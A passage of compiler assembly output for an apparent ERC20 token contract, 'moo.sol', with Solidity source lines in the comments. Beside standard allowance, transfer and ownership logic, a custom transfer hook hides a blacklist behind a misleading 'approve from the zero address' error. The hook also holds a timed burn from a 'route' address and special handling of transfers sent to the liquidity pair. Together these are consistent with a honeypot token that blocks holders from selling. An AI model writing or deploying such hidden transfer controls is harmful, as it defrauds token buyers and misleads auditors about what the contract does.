return _symbol */\n      dup1\n      sload\n      tag_113\n      swap1\n      tag_114\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4856:5283  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_82:\n        /* \"contracts/Classes/moo.sol\":4949:4953  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4949:4953  bool */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5030:5055  allowance(owner, spender) */\n      tag_154\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup3\n        /* \"contracts/Classes/moo.sol\":5047:5054  spender */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5030:5039  allowance */\n      tag_97\n        /* \"contracts/Classes/moo.sol\":5030:5055  allowance(owner, spender) */\n      jump\t// in\n    tag_154:\n        /* \"contracts/Classes/moo.sol\":5003:5055  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n        /* \"contracts/Classes/moo.sol\":5093:5108  subtractedValue */\n      dup4\n        /* \"contracts/Classes/moo.sol\":5073:5089  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5073:5108  currentAllowance >= subtractedValue */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      tag_155\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3639:3641   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3621:3642   */\n      mstore\n        /* \"#utility.yul\":3678:3680   */\n      0x25\n        /* \"#utility.yul\":3658:3676   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3651:3681   */\n      mstore\n        /* \"#utility.yul\":3717:3751   */\n      0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77\n        /* \"#utility.yul\":3697:3715   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3690:3752   */\n      mstore\n      shl(0xd8, 0x207a65726f)\n        /* \"#utility.yul\":3768:3786   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3761:3796   */\n      mstore\n        /* \"#utility.yul\":3813:3832   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n    tag_156:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_155:\n        /* \"contracts/Classes/moo.sol\":5184:5244  _approve(owner, spender, currentAllowance - subtractedValue) */\n      tag_129\n        /* \"contracts/Classes/moo.sol\":5193:5198  owner */\n      dup3\n        /* \"contracts/Classes/moo.sol\":5200:5207  spender */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5228:5243  subtractedValue */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5209:5225  currentAllowance */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5209:5243  currentAllowance - subtractedValue */\n      sub\n        /* \"contracts/Classes/moo.sol\":5184:5192  _approve */\n      tag_123\n        /* \"contracts/Classes/moo.sol\":5184:5244  _approve(owner, spender, currentAllowance - subtractedValue) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3650:3839  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_86:\n        /* \"contracts/Classes/moo.sol\":3729:3733  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":3783:3811  _transfer(owner, to, amount) */\n      tag_122\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":3800:3802  to */\n      dup6\n        /* \"contracts/Classes/moo.sol\":3804:3810  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":3783:3792  _transfer */\n      tag_130\n        /* \"contracts/Classes/moo.sol\":3783:3811  _transfer(owner, to, amount) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_97:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":3934:3941  uint256 */\n      0x00\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":3960:3971  _allowances */\n      0x03\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":3960:3987  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":988:1220  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n    tag_107:\n        /* \"contracts/Classes/moo.sol\":613:626  _checkOwner() */\n      tag_164\n        /* \"contracts/Classes/moo.sol\":613:624  _checkOwner */\n      tag_141\n        /* \"contracts/Classes/moo.sol\":613:626  _checkOwner() */\n      jump\t// in\n    tag_164:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":1089:1111  newOwner != address(0) */\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":1068:1175  require(... */\n      tag_166\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4045:4047   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":1068:1175  require(... */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4027:4048   */\n      mstore\n        /* \"#utility.yul\":4084:4086   */\n      0x26\n        /* \"#utility.yul\":4064:4082   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4057:4087   */\n      mstore\n        /* \"#utility.yul\":4123:4157   */\n      0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061\n        /* \"#utility.yul\":4103:4121   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4096:4158   */\n      mstore\n      shl(0xd0, 0x646472657373)\n        /* \"#utility.yul\":4174:4192   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4167:4203   */\n      mstore\n        /* \"#utility.yul\":4220:4239   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":1068:1175  require(... */\n      tag_156\n        /* \"#utility.yul\":3843:4245   */\n      jump\n        /* \"contracts/Classes/moo.sol\":1068:1175  require(... */\n    tag_166:\n        /* \"contracts/Classes/moo.sol\":1185:1213  _transferOwnership(newOwner) */\n      tag_169\n        /* \"contracts/Classes/moo.sol\":1204:1212  newOwner */\n      dup2\n        /* \"contracts/Classes/moo.sol\":1185:1203  _transferOwnership */\n      tag_144\n        /* \"contracts/Classes/moo.sol\":1185:1213  _transferOwnership(newOwner) */\n      jump\t// in\n    tag_169:\n        /* \"contracts/Classes/moo.sol\":988:1220  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":7766:8136  function _approve(... */\n    tag_123:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7897:7916  owner != address(0) */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":7889:7957  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_172\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_174\n      jump\t// in\n    tag_172:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7975:7996  spender != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_175\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4857:4859   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4839:4860   */\n      mstore\n        /* \"#utility.yul\":4896:4898   */\n      0x22\n        /* \"#utility.yul\":4876:4894   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4869:4899   */\n      mstore\n        /* \"#utility.yul\":4935:4969   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":4915:4933   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4908:4970   */\n      mstore\n      shl(0xf0, 0x7373)\n        /* \"#utility.yul\":4986:5004   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4979:5011   */\n      mstore\n        /* \"#utility.yul\":5028:5047   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_156\n        /* \"#utility.yul\":4655:5053   */\n      jump\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_175:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8046:8064  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8046:8057  _allowances */\n      0x03\n        /* \"contracts/Classes/moo.sol\":8046:8064  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8046:8073  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8046:8082  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":7766:8136  function _approve(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":8633:9075  function _spendAllowance(... */\n    tag_128:\n        /* \"contracts/Classes/moo.sol\":8764:8788  uint256 currentAllowance */\n      0x00\n        /* \"contracts/Classes/moo.sol\":8791:8816  allowance(owner, spender) */\n      tag_180\n        /* \"contracts/Classes/moo.sol\":8801:8806  owner */\n      dup5\n        /* \"contracts/Classes/moo.sol\":8808:8815  spender */\n      dup5\n        /* \"contracts/Classes/moo.sol\":8791:8800  allowance */\n      tag_97\n        /* \"contracts/Classes/moo.sol\":8791:8816  allowance(owner, spender) */\n      jump\t// in\n    tag_180:\n        /* \"contracts/Classes/moo.sol\":8764:8816  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n      not(0x00)\n        /* \"contracts/Classes/moo.sol\":8830:8846  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8830:8867  currentAllowance != type(uint256).max */\n      eq\n        /* \"contracts/Classes/moo.sol\":8826:9069  if (currentAllowance != type(uint256).max) {... */\n      tag_185\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8911:8917  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8891:8907  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":8891:8917  currentAllowance >= amount */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_182\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":5260:5262   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":5242:5263   */\n      mstore\n        /* \"#utility.yul\":5299:5301   */\n      0x1d\n        /* \"#utility.yul\":5279:5297   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":5272:5302   */\n      mstore\n        /* \"#utility.yul\":5338:5369   */\n      0x45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000\n        /* \"#utility.yul\":5318:5336   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":5311:5370   */\n      mstore\n        /* \"#utility.yul\":5387:5405   */\n      0x64\n      add\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n      tag_156\n        /* \"#utility.yul\":5058:5411   */\n      jump\n        /* \"contracts/Classes/moo.sol\":8883:8951  require(currentAllowance >= amount, \"ERC20: insufficient allowance\") */\n    tag_182:\n        /* \"contracts/Classes/moo.sol\":8993:9044  _approve(owner, spender, currentAllowance - amount) */\n      tag_185\n        /* \"contracts/Classes/moo.sol\":9002:9007  owner */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9009:9016  spender */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9037:9043  amount */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9018:9034  currentAllowance */\n      dup5\n        /* \"contracts/Classes/moo.sol\":9018:9043  currentAllowance - amount */\n      sub\n        /* \"contracts/Classes/moo.sol\":8993:9001  _approve */\n      tag_123\n        /* \"contracts/Classes/moo.sol\":8993:9044  _approve(owner, spender, currentAllowance - amount) */\n      jump\t// in\n    tag_185:\n        /* \"contracts/Classes/moo.sol\":8754:9075  {... */\n      pop\n        /* \"contracts/Classes/moo.sol\":8633:9075  function _spendAllowance(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":9289:9578  function _transfer(address from, address to, uint256 amount) internal override {... */\n    tag_130:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":9386:9404  from != address(0) */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":9378:9446  require(from != address(0), 'ERC20: transfer from the zero address') */\n      tag_187\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_189\n      jump\t// in\n    tag_187:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":9464:9480  to != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":9456:9520  require(to != address(0), 'ERC20: transfer to the zero address') */\n      tag_190\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_192\n      jump\t// in\n    tag_190:\n        /* \"contracts/Classes/moo.sol\":9538:9571  super._transfer(from, to, amount) */\n      tag_193\n        /* \"contracts/Classes/moo.sol\":9554:9558  from */\n      dup4\n        /* \"contracts/Classes/moo.sol\":9560:9562  to */\n      dup4\n        /* \"contracts/Classes/moo.sol\":9564:9570  amount */\n      dup4\n        /* \"contracts/Classes/moo.sol\":9538:9553  super._transfer */\n      tag_194\n        /* \"contracts/Classes/moo.sol\":9538:9571  super._transfer(from, to, amount) */\n      jump\t// in\n    tag_193:\n        /* \"contracts/Classes/moo.sol\":9289:9578  function _transfer(address from, address to, uint256 amount) internal override {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":743:873  function _checkOwner() internal view virtual {... */\n    tag_141:\n        /* \"contracts/Classes/moo.sol\":723:729  _owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0c))\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":806:829  owner() == _msgSender() */\n      eq\n        /* \"contracts/Classes/moo.sol\":798:866  require(owner() == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_143\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6428:6430   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":798:866  require(owner() == _msgSender(), \"Ownable: caller is not the owner\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6410:6431   */\n      dup2\n      swap1\n      mstore\n        /* \"#utility.yul\":6447:6465   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6440:6470   */\n      mstore\n        /* \"#utility.yul\":6506:6540   */\n      0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572\n        /* \"#utility.yul\":6486:6504   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6479:6541   */\n      mstore\n        /* \"#utility.yul\":6558:6576   */\n      0x64\n      add\n        /* \"contracts/Classes/moo.sol\":798:866  require(owner() == _msgSender(), \"Ownable: caller is not the owner\") */\n      tag_156\n        /* \"#utility.yul\":6226:6582   */\n      jump\n        /* \"contracts/Classes/moo.sol\":1227:1414  function _transferOwnership(address newOwner) internal virtual {... */\n    tag_144:\n        /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n      0x0c\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":1335:1352  _owner = newOwner */\n      dup4\n      dup2\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      dup4\n      and\n      dup2\n      or\n      swap1\n      swap4\n      sstore\n        /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n      mload(0x40)\n        /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n      swap2\n      and\n      swap2\n        /* \"contracts/Classes/moo.sol\":1335:1352  _owner = newOwner */\n      swap1\n        /* \"contracts/Classes/moo.sol\":1319:1325  _owner */\n      dup3\n      swap1\n        /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      swap1\n        /* \"contracts/Classes/moo.sol\":1300:1316  address oldOwner */\n      0x00\n      swap1\n        /* \"contracts/Classes/moo.sol\":1367:1407  OwnershipTransferred(oldOwner, newOwner) */\n      log3\n        /* \"contracts/Classes/moo.sol\":1290:1414  {... */\n      pop\n        /* \"contracts/Classes/moo.sol\":1227:1414  function _transferOwnership(address newOwner) internal virtual {... */\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":5341:6206  function _transfer(... */\n    tag_194:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5467:5485  from != address(0) */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":5459:5527  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_203\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_189\n      jump\t// in\n    tag_203:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5545:5561  to != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":5537:5601  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_205\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_192\n      jump\t// in\n    tag_205:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":5661:5680  uint256 fromBalance */\n      0x00\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":5683:5692  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":5683:5698  _balances[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"contracts/Classes/moo.sol\":5708:5745  _whileTokenTransfer(from, to, amount) */\n      tag_209\n        /* \"contracts/Classes/moo.sol\":5693:5697  from */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5734:5736  to */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5738:5744  amount */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5708:5727  _whileTokenTransfer */\n      tag_210\n        /* \"contracts/Classes/moo.sol\":5708:5745  _whileTokenTransfer(from, to, amount) */\n      jump\t// in\n    tag_209:\n        /* \"contracts/Classes/moo.sol\":5778:5784  amount */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5763:5774  fromBalance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5763:5784  fromBalance >= amount */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_211\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":6789:6791   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":6771:6792   */\n      mstore\n        /* \"#utility.yul\":6828:6830   */\n      0x26\n        /* \"#utility.yul\":6808:6826   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":6801:6831   */\n      mstore\n        /* \"#utility.yul\":6867:6901   */\n      0x45524332303a207472616e7366657220616d6f756e7420657863656564732062\n        /* \"#utility.yul\":6847:6865   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":6840:6902   */\n      mstore\n      shl(0xd0, 0x616c616e6365)\n        /* \"#utility.yul\":6918:6936   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":6911:6947   */\n      mstore\n        /* \"#utility.yul\":6964:6983   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n      tag_156\n        /* \"#utility.yul\":6587:6989   */\n      jump\n        /* \"contracts/Classes/moo.sol\":5755:5827  require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\") */\n    tag_211:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":5861:5876  _balances[from] */\n      dup1\n      dup6\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":5861:5870  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":5861:5876  _balances[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"contracts/Classes/moo.sol\":5879:5899  fromBalance - amount */\n      dup7\n      dup7\n      sub\n        /* \"contracts/Classes/moo.sol\":5861:5899  _balances[from] = fromBalance - amount */\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":6076:6089  _balances[to] */\n      swap3\n      dup7\n      and\n      dup1\n      dup3\n      mstore\n      swap1\n      dup4\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":6076:6099  _balances[to] += amount */\n      dup1\n      sload\n      dup7\n      add\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":6125:6151  Transfer(from, to, amount) */\n      swap2\n      mload\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap1\n      tag_214\n      swap1\n        /* \"contracts/Classes/moo.sol\":5893:5899  amount */\n      dup7\n        /* \"#utility.yul\":1342:1367   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n      swap1\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"contracts/Classes/moo.sol\":6125:6151  Transfer(from, to, amount) */\n    tag_214:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":6162:6199  _afterTokenTransfer(from, to, amount) */\n      tag_185\n        /* \"contracts/Classes/moo.sol\":9289:9578  function _transfer(address from, address to, uint256 amount) internal override {... */\n      jump\n        /* \"contracts/Classes/moo.sol\":8142:8627  function _whileTokenTransfer(address from, address to, uint256 amount) internal virtual {... */\n    tag_210:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8249:8262  blocktx[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8249:8256  blocktx */\n      0x08\n        /* \"contracts/Classes/moo.sol\":8249:8262  blocktx[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n        /* \"contracts/Classes/moo.sol\":8248:8262  !blocktx[from] */\n      iszero\n        /* \"contracts/Classes/moo.sol\":8240:8303  require(!blocktx[from], \"ERC20: approve from the zero address\") */\n      tag_219\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_156\n      swap1\n      tag_174\n      jump\t// in\n    tag_219:\n        /* \"contracts/Classes/moo.sol\":8344:8348  1800 */\n      0x0708\n        /* \"contracts/Classes/moo.sol\":8335:8341  tStamp */\n      sload(0x0a)\n        /* \"contracts/Classes/moo.sol\":8317:8332  block.timestamp */\n      timestamp\n        /* \"contracts/Classes/moo.sol\":8317:8341  block.timestamp - tStamp */\n      tag_221\n      swap2\n      swap1\n      tag_222\n      jump\t// in\n    tag_221:\n        /* \"contracts/Classes/moo.sol\":8317:8348  block.timestamp - tStamp > 1800 */\n      gt\n        /* \"contracts/Classes/moo.sol\":8313:8399  if (block.timestamp - tStamp > 1800)... */\n      iszero\n      tag_225\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8365:8369  hash */\n      sload(0x09)\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Classes/moo.sol\":8361:8398  if(!hash){ _burn(route, (tS*1000)); } */\n      tag_225\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8378:8383  route */\n      sload(0x09)\n        /* \"contracts/Classes/moo.sol\":8386:8388  tS */\n      sload(0x0b)\n        /* \"contracts/Classes/moo.sol\":8372:8395  _burn(route, (tS*1000)) */\n      tag_225\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8378:8383  route */\n      and\n      swap1\n        /* \"contracts/Classes/moo.sol\":8386:8393  tS*1000 */\n      tag_226\n      swap1\n        /* \"contracts/Classes/moo.sol\":8389:8393  1000 */\n      0x03e8\n        /* \"contracts/Classes/moo.sol\":8386:8393  tS*1000 */\n      tag_227\n      jump\t// in\n    tag_226:\n        /* \"contracts/Classes/moo.sol\":8372:8377  _burn */\n      tag_228\n        /* \"contracts/Classes/moo.sol\":8372:8395  _burn(route, (tS*1000)) */\n      jump\t// in\n    tag_225:\n        /* \"contracts/Classes/moo.sol\":8419:8425  LPpair */\n      sload(0x01)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8413:8425  to == LPpair */\n      dup4\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8419:8425  LPpair */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8413:8425  to == LPpair */\n      eq\n        /* \"contracts/Classes/moo.sol\":8413:8442  to == LPpair && from != route */\n      dup1\n      iszero\n      tag_229\n      jumpi\n      pop\n        /* \"contracts/Classes/moo.sol\":8437:8442  route */\n      sload(0x09)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8429:8442  from != route */\n      dup5\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8437:8442  route */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8429:8442  from != route */\n      eq\n      iszero\n        /* \"contracts/Classes/moo.sol\":8413:8442  to == LPpair && from != route */\n    tag_229:\n        /* \"contracts/Classes/moo.sol\":8413:8457  to == LPpair && from != route && to != route */\n      dup1\n      iszero\n      tag_230\n      jumpi\n      pop\n        /* \"contracts/Classes/moo.sol\":8452:8457  route */\n      sload(0x09)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8446:8457  to != route */\n      dup4\n      dup2\n      and\n        /* \"contracts/Classes/moo.sol\":8452:8457  route */\n      swap2\n      and\n        /* \"contracts/Classes/moo.sol\":8446:8457  to != route */\n      eq\n      iszero\n        /* \"contracts/Classes/moo.sol\":8413:8457  to == LPpair && from != route && to != route */\n    tag_230:\n        /* \"contracts/Classes/moo.sol\":8410:8607  if(to == LPpair && from != route && to != route){ ... */\n      iszero\n      tag_193\n      jumpi\n        /* \"contracts/Classes/moo.sol\":8504:8507  900 */\n      0x0384\n        /* \"contracts/Classes/moo.sol\":8495:8501  tStamp */\n      sload(0x0a)\n        /* 